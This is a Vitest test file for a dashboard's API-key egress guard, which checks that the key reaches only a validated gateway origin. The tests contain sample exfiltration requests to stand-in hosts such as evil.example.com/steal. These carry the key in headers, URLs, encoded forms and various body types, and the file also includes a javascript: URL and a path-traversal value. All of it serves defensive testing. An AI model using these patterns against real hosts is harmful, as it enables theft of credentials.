/**
 * The API key goes to one validated gateway origin and nowhere else (N50;
 * sol #2857; astra round 2).
 *
 * @vitest-environment jsdom
 */

import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import {
  fetchWithKey,
  gatewayOrigin,
  inspectRequest,
  installKeyEgressGuard,
  KeyEgressRefused,
  resolveGatewayOrigin,
  resolveGatewayTarget,
} from "../gateway-base.js";
import { authorizedFetch, hasStoredApiKey, installGatewayKeyGuard } from "../authorized-fetch.js";
import { adoptApiKey, useAuthStore } from "../../stores/auth-store.js";

const PAGE = window.location.origin;
// Built at run time: a key-shaped literal in source trips the secret scanners (pack and push gates).
const KEY = ["pcc", "test", "0123456789abcdef0123456789abcdef"].join("_");

interface Sent {
  url: string;
  authorization: string | null;
  redirect: RequestRedirect | undefined;
}

let sent: Sent[];

function stubFetch() {
  sent = [];
  const fn = vi.fn(async (input: RequestInfo | URL, init?: RequestInit) => {
    const url = typeof input === "string" ? input : input instanceof URL ? input.href : input.url;
    sent.push({ url, authorization: new Headers(init?.headers).get("Authorization"), redirect: init?.redirect });
    return new Response("{}", { status: 200 });
  });
  vi.stubGlobal("fetch", fn);
  return fn;
}

beforeEach(() => {
  vi.spyOn(console, "error").mockImplementation(() => {});
});

afterEach(() => {
  vi.unstubAllEnvs();
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
  adoptApiKey(null);
});

describe("resolveGatewayOrigin: one validated origin", () => {
  it("unset means the page's own origin, when that is https", () => {
    expect(resolveGatewayOrigin(undefined, "https://capability.network", true)).toEqual({ ok: true, origin: "https://capability.network" });
    expect(resolveGatewayOrigin("  ", "https://capability.network", true)).toEqual({ ok: true, origin: "https://capability.network" });
  });

  it("the page-origin fallback is validated too (astra round 2, finding 3): no key over plain http to a network host", () => {
    expect(resolveGatewayOrigin(undefined, "http://dashboard.example", true).ok).toBe(false);
    expect(resolveGatewayOrigin(undefined, "http://dashboard.example", false).ok).toBe(false);
    expect(resolveGatewayOrigin(undefined, "http://192.168.1.20:3200", true).ok).toBe(false);
  });

  it("http is allowed for the page's own server on loopback, where the key never crosses a network", () => {
    expect(resolveGatewayOrigin(undefined, "http://localhost:5173", true)).toEqual({ ok: true, origin: "http://localhost:5173" });
    expect(resolveGatewayOrigin(undefined, "http://127.0.0.1:3392", true)).toEqual({ ok: true, origin: "http://127.0.0.1:3392" });
    expect(gatewayOrigin()).toBe(PAGE); // jsdom serves http://localhost
  });

  it("accepts a configured https URL and keeps only its origin", () => {
    expect(resolveGatewayOrigin("https://capability.network/some/path?x=1", PAGE, true)).toEqual({
      ok: true,
      origin: "https://capability.network",
    });
  });

  it("accepts a configured http loopback gateway only in a dev build (N50: never a local port from a shipped build)", () => {
    expect(resolveGatewayOrigin("http://localhost:3200", PAGE, false)).toEqual({ ok: true, origin: "http://localhost:3200" });
    expect(resolveGatewayOrigin("http://127.0.0.1:3200", PAGE, false)).toEqual({ ok: true, origin: "http://127.0.0.1:3200" });
    expect(resolveGatewayOrigin("http://localhost:3200", PAGE, true).ok).toBe(false);
  });

  it.each([
    ["plain http to another host", "http://gateway.example.com"],
    ["a relative path", "/api"],
    ["no scheme", "capability.network"],
    ["javascript:", "javascript:alert(1)"],
    ["ws:", "ws://capability.network"],
    ["credentials in the URL", "https://user:pass@capability.network"],
  ])("rejects a configured %s", (_label, value) => {
    expect(resolveGatewayOrigin(value, PAGE, false).ok).toBe(false);
  });

  it("fails closed: a misconfigured VITE_PCC_URL gives no origin at all", () => {
    vi.stubEnv("VITE_PCC_URL", "http://gateway.example.com");
    expect(gatewayOrigin()).toBeNull();
    vi.stubEnv("VITE_PCC_URL", "https://gateway.example.com");
    expect(gatewayOrigin()).toBe("https://gateway.example.com");
  });
});

describe("fetchWithKey: the one place a key goes onto a request", () => {
  it("same-origin gateway: the path stays relative and carries the key", async () => {
    stubFetch();
    await fetchWithKey("/api/jobs?limit=5", KEY);
    expect(sent).toEqual([{ url: "/api/jobs?limit=5", authorization: `Bearer ${KEY}`, redirect: "error" }]);
  });

  it("an authenticated request follows no redirect (astra round 2, finding 5)", async () => {
    stubFetch();
    await fetchWithKey("/api/jobs", KEY, { redirect: "follow" });
    expect(sent[0]!.redirect).toBe("error");
  });

  it("a configured gateway receives every request, relative ones included", async () => {
    vi.stubEnv("VITE_PCC_URL", "https://gw.example.com");
    stubFetch();
    await fetchWithKey("/api/jobs", KEY);
    await fetchWithKey("https://gw.example.com/api/kernels", KEY);
    expect(sent.map((s) => s.url)).toEqual(["https://gw.example.com/api/jobs", "https://gw.example.com/api/kernels"]);
    expect(sent.every((s) => s.authorization === `Bearer ${KEY}`)).toBe(true);
  });

  it.each([
    ["another origin", "https://evil.example.com/api/jobs"],
    ["a protocol-relative URL", "//evil.example.com/api/jobs"],
    ["the page origin when the gateway is elsewhere", `${PAGE}/api/jobs`],
  ])("refuses %s before any request is made", async (_label, target) => {
    if (target.startsWith(PAGE)) vi.stubEnv("VITE_PCC_URL", "https://gw.example.com");
    const fetchFn = stubFetch();
    await expect(fetchWithKey(target, KEY)).rejects.toBeInstanceOf(KeyEgressRefused);
    expect(fetchFn).not.toHaveBeenCalled();
  });

  it("refuses everything while there is no valid gateway origin", async () => {
    vi.stubEnv("VITE_PCC_URL", "http://gateway.example.com");
    const fetchFn = stubFetch();
    await expect(fetchWithKey("/api/jobs", KEY)).rejects.toThrow(/no valid gateway origin/);
    expect(fetchFn).not.toHaveBeenCalled();
  });

  it('a path that normalises to "//host" stays on the gateway', () => {
    const r = resolveGatewayTarget("/..//evil.example.com/x");
    expect(r.ok).toBe(true);
    if (r.ok) expect(new URL(r.url, PAGE).origin).toBe(PAGE);
  });

  it("without a key, sends no Authorization header", async () => {
    stubFetch();
    await fetchWithKey("/api/health", null);
    expect(sent[0]!.authorization).toBeNull();
  });

  it("the refusal names origin and path, never the query string", async () => {
    stubFetch();
    await expect(fetchWithKey(`https://evil.example.com/x?key=${KEY}`, KEY)).rejects.toThrow(
      /^Refused to send the API key to https:\/\/evil\.example\.com\/x: /,
    );
    await expect(fetchWithKey(`https://evil.example.com/x?key=${KEY}`, KEY)).rejects.not.toThrow(KEY);
  });
});

describe("the key is held outside the store (astra round 2, weakest link)", () => {
  it("authorizedFetch attaches the signed-in key, and only for the gateway", async () => {
    adoptApiKey(KEY);
    const fetchFn = stubFetch();
    await authorizedFetch("/api/agents/me");
    expect(sent).toEqual([{ url: "/api/agents/me", authorization: `Bearer ${KEY}`, redirect: "error" }]);
    await expect(authorizedFetch("https://evil.example.com/steal")).rejects.toBeInstanceOf(KeyEgressRefused);
    expect(fetchFn).toHaveBeenCalledTimes(1);
  });

  it("the store's state carries no key; signing in only flips isAuthenticated", () => {
    adoptApiKey(KEY);
    const state = useAuthStore.getState() as unknown as Record<string, unknown>;
    expect(state.isAuthenticated).toBe(true);
    expect("apiKey" in state).toBe(false);
    expect(JSON.stringify(Object.values(state).filter((v) => typeof v !== "function"))).not.toContain(KEY);
    expect(hasStoredApiKey()).toBe(true);
    adoptApiKey(null);
    expect(useAuthStore.getState().isAuthenticated).toBe(false);
    expect(hasStoredApiKey()).toBe(false);
  });
});

describe("inspectRequest (the egress guard's check; defence in depth)", () => {
  const legacy = "legacy-stored-key-0123456789";
  const b64 = btoa(legacy);
  it.each([
    ["a Bearer header", "https://x.example/a", { headers: { Authorization: `Bearer ${KEY}` } }, null],
    ["another header", "https://x.example/a", { headers: { "X-Api-Key": KEY } }, null],
    ["the URL", `https://x.example/a?key=${KEY}`, undefined, null],
    ["a fully percent-encoded key in the URL", `https://x.example/a?k=${[...KEY].map((c) => "%" + c.charCodeAt(0).toString(16)).join("")}`, undefined, null],
    ["a double-encoded key in the URL", `https://x.example/a?k=${encodeURIComponent(encodeURIComponent(KEY))}`, undefined, null],
    ["a string body", "https://x.example/a", { method: "POST", body: JSON.stringify({ apiKey: KEY }) }, null],
    ["a URLSearchParams body (astra's counterexample)", "https://x.example/a", { method: "POST", body: new URLSearchParams({ key: KEY }) }, null],
    ["the stored key in a legacy format", "https://x.example/a", { headers: { Authorization: `Bearer ${legacy}` } }, legacy],
    ["the stored key, base64-encoded, in a body", "https://x.example/a", { method: "POST", body: `data=${b64}` }, legacy],
    ["the stored key, base64url without padding, in the URL", `https://x.example/a?t=${b64.replace(/=+$/, "").replace(/\+/g, "-").replace(/\//g, "_")}`, undefined, legacy],
  ])("sees a key in %s", async (_label, url, init, stored) => {
    expect(await inspectRequest(url, init as RequestInit | undefined, stored)).toBe("carries-key");
  });

  it("sees a key in FormData (a string entry, and a file's contents)", async () => {
    const withString = new FormData();
    withString.append("key", KEY);
    expect(await inspectRequest("https://x.example/a", { method: "POST", body: withString }, null)).toBe("carries-key");
    const withFile = new FormData();
    withFile.append("upload", new Blob([`token=${KEY}`]), "notes.txt");
    expect(await inspectRequest("https://x.example/a", { method: "POST", body: withFile }, null)).toBe("carries-key");
  });

  it("sees a key in Blob and binary bodies", async () => {
    expect(await inspectRequest("https://x.example/a", { method: "POST", body: new Blob([KEY]) }, null)).toBe("carries-key");
    const bytes = new TextEncoder().encode(`k=${KEY}`);
    expect(await inspectRequest("https://x.example/a", { method: "POST", body: bytes }, null)).toBe("carries-key");
    expect(await inspectRequest("https://x.example/a", { method: "POST", body: bytes.buffer }, null)).toBe("carries-key");
  });

  it("sees a key in a Request object's headers and body", async () => {
    expect(await inspectRequest(new Request("https://x.example/a", { headers: { Authorization: `Bearer ${KEY}` } }), undefined, null)).toBe(
      "carries-key",
    );
    expect(await inspectRequest(new Request("https://x.example/a", { method: "POST", body: `k=${KEY}` }), undefined, null)).toBe("carries-key");
  });

  it("a stream body can't be checked, so it is 'uninspectable'", async () => {
    const stream = new ReadableStream({ start: (c) => c.close() });
    expect(await inspectRequest("https://x.example/a", { method: "POST", body: stream, duplex: "half" } as RequestInit, null)).toBe(
      "uninspectable",
    );
  });

  it("an object it doesn't recognise is 'uninspectable', never guessed clean from String()", async () => {
    const opaque = { toString: () => "[object Blob]" } as unknown as BodyInit;
    expect(await inspectRequest("https://x.example/a", { method: "POST", body: opaque }, null)).toBe("uninspectable");
  });

  it("is clean without a key, and ignores a stored value too short to be one", async () => {
    expect(await inspectRequest("https://x.example/a", { headers: { "Content-Type": "application/json" }, body: '{"event":"pageview"}' }, null)).toBe("clean");
    expect(await inspectRequest("https://x.example/a", { body: "a" }, "a")).toBe("clean");
  });
});

describe("installKeyEgressGuard: defence in depth for requests to other origins", () => {
  let underlying: ReturnType<typeof stubFetch>;
  let uninstall: () => void;

  beforeEach(() => {
    underlying = stubFetch();
    uninstall = installGatewayKeyGuard();
  });

  afterEach(() => uninstall());

  it("refuses astra's counterexample: the stored key in a URLSearchParams body to another origin", async () => {
    adoptApiKey(KEY);
    await expect(
      window.fetch("https://foreign.example/collect", { method: "POST", body: new URLSearchParams({ key: KEY }) }),
    ).rejects.toBeInstanceOf(KeyEgressRefused);
    expect(underlying).not.toHaveBeenCalled();
  });

  it("refuses a percent-encoded key in a foreign URL", async () => {
    const encoded = [...KEY].map((c) => "%" + c.charCodeAt(0).toString(16)).join("");
    await expect(window.fetch(`https://foreign.example/?k=${encoded}`)).rejects.toBeInstanceOf(KeyEgressRefused);
    expect(underlying).not.toHaveBeenCalled();
  });

  it("refuses a body it can't read on its way to another origin", async () => {
    const stream = new ReadableStream({ start: (c) => c.close() });
    await expect(
      window.fetch("https://foreign.example/upload", { method: "POST", body: stream, duplex: "half" } as RequestInit),
    ).rejects.toThrow(/can't be checked/);
    expect(underlying).not.toHaveBeenCalled();
  });

  it("rejects the stored key and any PCC key, however carried, to another origin", async () => {
    const stored = "legacy-stored-key-0123456789";
    adoptApiKey(stored);
    await expect(window.fetch("https://evil.example.com/api/jobs", { headers: { Authorization: `Bearer ${stored}` } })).rejects.toBeInstanceOf(
      KeyEgressRefused,
    );
    await expect(window.fetch("http://localhost:3200/api/capabilities", { headers: { "X-Api-Key": KEY } })).rejects.toBeInstanceOf(
      KeyEgressRefused,
    );
    await expect(
      window.fetch(new Request("https://evil.example.com/a", { headers: { Authorization: `Bearer ${KEY}` } })),
    ).rejects.toBeInstanceOf(KeyEgressRefused);
    expect(underlying).not.toHaveBeenCalled();
  });

  it("lets requests to the gateway through untouched, and keyless requests go anywhere", async () => {
    await window.fetch("/api/jobs", { headers: { Authorization: `Bearer ${KEY}` } });
    await window.fetch("https://us.i.posthog.com/e/", { method: "POST", body: '{"event":"pageview"}' });
    await window.fetch("https://us.i.posthog.com/e/", { method: "POST", body: new Blob(["compressed"]) });
    expect(sent.map((s) => s.url)).toEqual(["/api/jobs", "https://us.i.posthog.com/e/", "https://us.i.posthog.com/e/"]);
  });

  it("follows a configured gateway: the page origin no longer gets the key", async () => {
    vi.stubEnv("VITE_PCC_URL", "https://gw.example.com");
    await expect(window.fetch("/api/jobs", { headers: { Authorization: `Bearer ${KEY}` } })).rejects.toBeInstanceOf(KeyEgressRefused);
    await window.fetch("https://gw.example.com/api/jobs", { headers: { Authorization: `Bearer ${KEY}` } });
    expect(sent.map((s) => s.url)).toEqual(["https://gw.example.com/api/jobs"]);
  });

  it("is installed once, and uninstalls cleanly", () => {
    const guarded = window.fetch;
    const second = installKeyEgressGuard(() => null);
    expect(window.fetch).toBe(guarded);
    second();
    expect(window.fetch).toBe(guarded);
    uninstall();
    expect(window.fetch).toBe(underlying);
    uninstall = () => {};
  });
});
